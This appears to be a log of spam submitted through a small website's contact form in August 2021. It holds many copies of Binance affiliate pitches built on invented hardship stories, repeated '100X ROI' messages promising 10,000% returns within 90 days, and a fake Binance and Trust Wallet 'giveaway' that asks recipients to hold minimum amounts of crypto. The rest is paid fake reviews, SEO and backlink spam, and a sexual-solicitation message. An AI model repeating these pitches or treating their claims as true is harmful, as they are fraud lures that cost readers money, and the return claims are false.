Covid19 has caused me to lose my job and I am doing what I can to make some money to put food on the table. If you have some spare change, please research cryptocurrencies and this is really a once in a lifetime opportunity to trade.

If you do not have any spare cash, you can still sign up for a free account and make money by promoting Binance to your friends! This is a great way to earn a little side income during this challenging times.

Act Now!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-08-10 04:21:41 AM -- Email from: Orlando Puente, -- subject: Sick and Tired of your wife? Try this, -- email: orlando.puente@gmail.com, -- Message is: Some new comers in crypto-sphere in the last 2 years have made life-changing gains within a short period of time.

And many are reporting this to be a &quot;wife-changing experience&quot; as well.

While you may laugh at this, people really CAN change when crazy gains are made.

Are you sick of your marriage and feel stuck?

It is time to do something about it. Times are very difficult admist the pandemic and sometime we need to try something different. Cryptocurrency is the biggest techological revolution since the internet. Do not miss out on this!


PS: Even if you do NOT want to buy cryptocurrency, do you know that the world's biggest exchange Binance has a referral program? You can sign up at Binance here (https://bit.ly/33yXOqz) even if you are NOT going to trade. After 
signing up with Binance, you can share your referal links with your friends and make some passive income on the side. You get paid a small fee whenever your referrals buy or sell cryptocurrencies in Binance!

Covid19 has caused me to lose my job and I am doing what I can to make some money to put food on the table. If you have some spare change, please research cryptocurrencies and this is really a once in a lifetime opportunity to trade.

If you do not have any spare cash, you can still sign up for a free account and make money by promoting Binance to your friends! This is a great way to earn a little side income during this challenging times.

Act Now!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-08-10 08:34:49 AM -- Email from: Torrie Rossa, -- subject: Arnoldo Yerico, -- email: HershelWetzel@gmail.com, -- Message is: 7 Ways To Promote Your Business Online For Free : https://bit.ly/free-stuff-blog
+++ 2021-08-10 06:11:44 PM -- Email from: Mike Garrison, -- subject: quality monthly SEO plans, -- email: leonardharris3262@gmail.com, -- Message is: Hi 
 
I have just took an in depth look on your  esyray.com for  the current search visibility and saw that your website could use a push. 
 
We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start improving your sales and leads with us, today! 
 
regards 
Mike Garrison
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-08-10 07:36:08 PM -- Email from: Tandy Lowe, -- subject: , -- email: 1dje@urbansvg.com, -- Message is: Do not pay for advertising ever again:  https://bit.ly/permanently-free-ads
+++ 2021-08-11 04:26:06 AM -- Email from: WTE, -- subject: Make a 10,000% return on investment within 180 days, -- email: 100x@wtebank.com, -- Message is: 
+++ 2021-08-11 03:16:40 PM -- Email from: Cristina Gormanston, -- subject: Side income from cryptocurrencies without putting any money in, -- email: cristina.gormanston62@outlook.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-11 04:17:08 PM -- Email from: Toney Cross, -- subject: Side income from cryptocurrencies without putting any money in, -- email: cross.toney@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-12 01:06:33 AM -- Email from: Teena Smithson, -- subject: Attention: Your Backlinks - esyray.com, -- email: smithson.teena@gmail.com, -- Message is: Your website is awesome but…

Good morning, 

There is no black magic to successfully attracting traffic via the internet, but it's commonly known that marketing can help a lot.

To effortlessly win other businesses like yours over the web you should have  this enormous package:
	
https://business-it-services.com/backlinks-generator


Regards,
We offer the very best marketing services you can order on our shop to make big money in a small business, still not thinking about getting new clients? Here is a quick, 1-click unsubscribe link: https://business-it-services.com/?unsubscribe=esyray.com
+++ 2021-08-12 05:26:25 AM -- Email from: Newton Purton, -- subject: Explosive Business Data - SunDataGroup.one, -- email: newton@sundatagroup.one, -- Message is: New data just for you!

Hi, just letting you know you can now select from hundreds of millions of data records in 200+ countries and in various industries. Benefit from it as soon as possible.

Browse our databases or request a custom list that suits your needs.

There's something for everyone.

Have a look!
https://sundatagroup.one
+++ 2021-08-12 07:41:58 PM -- Email from: 100X ROI, -- subject: Make a 10,000% return on investment within 180 days, -- email: 100x@wtebank.com, -- Message is: 
+++ 2021-08-12 09:02:31 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-08-13 03:00:57 AM -- Email from: Jason Ward, -- subject: Posting positive reviews, -- email: jasonward9681@gmail.com, -- Message is: Hello, 
 
Our company, RatingsKing, specializes in posting 5-star testimonials on all major review sites. This way people can find you much easier and get a good impression of your business. 
Just go on our website and choose the package that best fits your needs at https://ratingsking.com/packages.php 
 
Our packages start from $49/month. 
Depending on your package you will have a number of positive reviews that we will do for you. You will have reports monthly with the work that has been done in your account. 
 
Usually, we are posting on all major reviews sites or other listings you may have.
+++ 2021-08-13 08:19:32 AM -- Email from: 100X INVESTMENT, -- subject: Make a 10,000% return on investment within 90 days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-08-13 08:26:42 PM -- Email from: 100X ROI, -- subject: Make a 10,000% return on investment within 90 days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-08-14 07:56:57 AM -- Email from: 100X ROI, -- subject: Make a 10,000% return on investment within 90 days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: 
+++ 2021-08-14 08:55:45 PM -- Email from: 100X ROI, -- subject: Turn $5K Into $500K Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $5,000 investment into $500,000 in income within 90 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-14 11:35:18 PM -- Email from: Sarah Green, -- subject: Issue with your website, -- email: GreenJT67@gmail.com, -- Message is: Hi There,

Just a heads-up that I believe this link is broken on your website: https://www.esyray.com/lettersfromretirees.html  

I had a couple of them on my own site before I started using a service to monitor for them.  There are a few sites that do this but we like DeadLinkSearch.com.

-Sarah
+++ 2021-08-15 06:00:16 AM -- Email from: Wanda Pfeifer, -- subject: Side income from cryptocurrencies without putting any money in, -- email: pfeifer.wanda27@yahoo.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-15 06:46:21 AM -- Email from: Woodrow Faigley, -- subject: Cherlyn Cronin, -- email: GloryBerg@gmail.com, -- Message is: 20 Clever Ways To Get Free Advertising On Google &amp; Beyond : https://bit.ly/free-stuff-blog
+++ 2021-08-15 10:25:32 AM -- Email from: 100X ROI, -- subject: Turn $10K Into $1M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $10K investment into $1M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-15 06:35:57 PM -- Email from: WTE, -- subject: Make a 10,000% return on investment within 180 days, -- email: 100x@wtebank.com, -- Message is: 
+++ 2021-08-15 11:39:38 PM -- Email from: 100X ROI, -- subject: Turn $20K Into $2M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $20K investment into $2M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-16 01:49:06 AM -- Email from: Gregory Benefield, -- subject: Side income from cryptocurrencies without putting any money in, -- email: benefield.gregory@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-16 02:41:58 AM -- Email from: Jo Streit, -- subject: , -- email: streit.jo@gmail.com, -- Message is: You won't believe how easy it is to get free advertising on Google. Here's 20 Clever Ways to Get Free Advertising on Google &amp; Beyond: https://bit.ly/how-to-get-free-advertising-on-google
+++ 2021-08-16 11:57:37 AM -- Email from: Samantha Clutter, -- subject: Side income from cryptocurrencies without putting any money in, -- email: samantha.clutter@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-16 12:33:19 PM -- Email from: 100X ROI, -- subject: Turn $30K Into $3M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $30K investment into $3M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-16 01:09:02 PM -- Email from: WTE, -- subject: Turn $1M Into $100M Within 180 Days, -- email: 100x@wtebank.com, -- Message is: You can turn a $1M investment into $100M in income within 180 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 180 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-16 01:43:36 PM -- Email from: WTE, -- subject: Invest $1M and earn $100M within 180 days, -- email: 100x@wtebank.com, -- Message is: You can turn a $1M investment into $100M in income within 180 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 180 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-17 12:31:06 AM -- Email from: Jose Gagne, -- subject: Re-check your website performance - esyray.com, -- email: gagne.jose@msn.com, -- Message is: A client recommended I get in touch.

Good evening, 

The best place to hide a dead body is the second page of Google search. Get esyray.com on the first page.

To effortlessly increase sales over the internet you need this fantastic service:
	
https://your-web-marketing.com/backlinks-generator


Best regards,
We offer the best marketing services you can find on our online shop to make big money in a small business, still not interested in getting new business? Here is a straightforward, 1-click unsubscribe link: https://your-web-marketing.com/?unsubscribe=esyray.com
+++ 2021-08-17 02:17:05 AM -- Email from: 100X ROI, -- subject: Turn $40K Into $4M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $40K investment into $4M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-17 04:45:18 PM -- Email from: 100X ROI, -- subject: Turn $50K Into $5M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $50K investment into $5M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-18 06:38:35 AM -- Email from: 100X ROI, -- subject: Turn $100K Into $10M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $100K investment into $10M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-18 10:48:46 AM -- Email from: Madge Lindberg, -- subject: urgent question, -- email: mgould1536@icloud.com, -- Message is: U wanna anal sexy?

https://panaceacannabisoil.co.za/
+++ 2021-08-19 12:54:28 AM -- Email from: WTE, -- subject: Make a 10,000% return on investment within 180 days, -- email: 100x@wtebank.com, -- Message is: 
+++ 2021-08-19 06:00:06 AM -- Email from: 100X ROI, -- subject: Turn $250K Into $25M Within 90 Days, -- email: noreply88@bit.ly/3inYNlt, -- Message is: You can turn a $250K investment into $25M in income within 90 days by investing in the 100X investment account. The 100X investment account offers you a 10,000% return on investment (100-fold return on investment, 100X or 100 times your money) within 90 days! To learn more about the 100X investment account, go to https://bit.ly/3inYNlt now. To your success, Jason Brian
+++ 2021-08-19 11:41:53 AM -- Email from: Federico Bundey, -- subject: Side income from cryptocurrencies without putting any money in, -- email: bundey.federico@hotmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-19 12:02:51 PM -- Email from: 100X ROI, -- subject: Invest $250K and earn $25M within 180 days, -- email: 100x@wtebank.com, -- Message is: You can turn a $250K investment into $25M in income within 180 days by investing in the 100X investment account. The 100X investment account is the best investment opportunity globally because it offers you a 10,000% return on investment  within 180 days! To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn
+++ 2021-08-19 05:46:00 PM -- Email from: Simon Jones, -- subject: Binance x Trust Wallet Official Crypto Giveaway, -- email: admin@2xbinancebonushelp.network, -- Message is: To celebrate the 2 year anniversary of Binance’s acquisition of Trust Wallet, we’re teaming up with Trust for the biggest giveaway ever!. 
 
You will receive a 2x/3x bonus depending on the amount you participate with. This event will end once the assigned coins are distributed completely. To participate, you are required to have at least the Following in your wallet. 
1 ETH, 0.05 BTC, 1000.0 XRP, 15,000 TRX, 2.5 LTC. 
 
 
https://2xbonusstore.online
+++ 2021-08-21 08:11:46 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-08-21 11:02:18 AM -- Email from: Richelle Sisk, -- subject: Side income from cryptocurrencies without putting any money in, -- email: richelle.sisk@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-22 12:34:04 PM -- Email from: Saul Hargrove, -- subject: , -- email: lzinoa@luddo.me, -- Message is: With over 3.5 billion searches per day, Google is a hotspot for consumers. And with its location-specific and rich results, it is ingrained in our daily lives as the go-to tool for, well, anything — getting the weather, buying tickets, finding products, vetting services, answering quick questions, seeing if a local store is open, and the list goes on. Here are some strategies your local business can implement to get on this highly trafficked search engine for free. https://1mdr.short.gy/l4bIIa
+++ 2021-08-23 08:41:07 PM -- Email from: 100X ROI, -- subject: Make a 10,080% return on investment within 360 days, -- email: 100x@wtebank.com, -- Message is: 
+++ 2021-08-24 12:14:30 AM -- Email from: SEO X Press Digital Agency, -- subject: Get more dofollow backlinks for esyray.com, -- email: no-replyGesUnfonse@gmail.com, -- Message is: Hello 
 
We all know the importance that dofollow link have on any website`s ranks. 
Having most of your linkbase filled with nofollow ones is of no good for your ranks and SEO metrics. 
 
Buy quality dofollow links from us, that will impact your ranks in a positive way 
https://www.digital-x-press.com/product/150-dofollow-backlinks/ 
 
Best regards 
Mike Goodman
 
support@digital-x-press.com
+++ 2021-08-24 12:17:02 AM -- Email from: Mike Bawerman, -- subject: Increase sales for esyray.com, -- email: johnmclaughlin7162@gmail.com, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Bawerman
 
support@monkeydigital.co
+++ 2021-08-24 02:11:29 AM -- Email from: Sol Wimble, -- subject: Verified Facebook Page Reviews wait for esyray.com, -- email: wimble.sol@gmail.com, -- Message is: Did you find what you were looking for?

Verified Facebook Reviews magically enhance your business ranking on social media.

Here is the imperative plan it’s necessary to win fresh customers over the internet:
	
https://geeks-marketing.com/facebook-page-reviews


Regards,
We offer the most effective IT services you can find on our online shop to make big money in a small business, still not interested in getting new clients? Here is a simple, 1-click unsubscribe link: https://geeks-marketing.com/?unsubscribe=esyray.com
+++ 2021-08-24 04:43:56 AM -- Email from: Gus Bastow, -- subject: Side income from cryptocurrencies without putting any money in, -- email: bastow.gus@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-24 07:55:12 PM -- Email from: Lucile Martins, -- subject: Side income from cryptocurrencies without putting any money in, -- email: martins.lucile@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-25 04:10:13 PM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-08-25 07:58:09 PM -- Email from: , -- subject: , -- email: hebblethwaite.julia@outlook.com, -- Message is: 
+++ 2021-08-25 08:41:02 PM -- Email from: Shari Bowlin, -- subject: Side income from cryptocurrencies without putting any money in, -- email: bowlin.shari8@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

Like many others, the pandemic has hit me hard and I lost my job. Now I am doing what I can in between jobs and experimenting with different ways to make money from the internet.

I chanced upon Binance.com (https://bit.ly/3jLZLrm) and started promoting my Binance.com affiliate links to my friends and online. When you introduce your friends to Binance, you get a LIFETIME commission everytime they trade in Binance!

You do need a large number of affiliates to make things work. I was lucky to sign up 3  friends who put in USD$10,000 each and depending from their trade volume, I made an extra USD$1000 to $5000 per month PASSIVELY.

As such, you do not need to put any money of your own into Binance, you can also make money by referring Binance to your friends and associates! -&gt; https://bit.ly/3jLZLrm (my Binance affiliate link)


Go to this url and simply sign up with your email and password. This takes only 30 seconds!  -&gt; https://bit.ly/3jLZLrm
+++ 2021-08-25 09:00:43 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-08-25 09:23:52 PM -- Email from: Tanja Lair, -- subject: Side income from cryptocurrencies without putting any money in, -- email: tanja.lair@gmail.com, -- Message is: Hi,

Firstly let me apologise to you as I know this is not the best way to reach you (contact form marketing). I am at my wits end to generate more income to provide for my wife and children and this is a legal (and I hope to make up to you by providing free educational value)

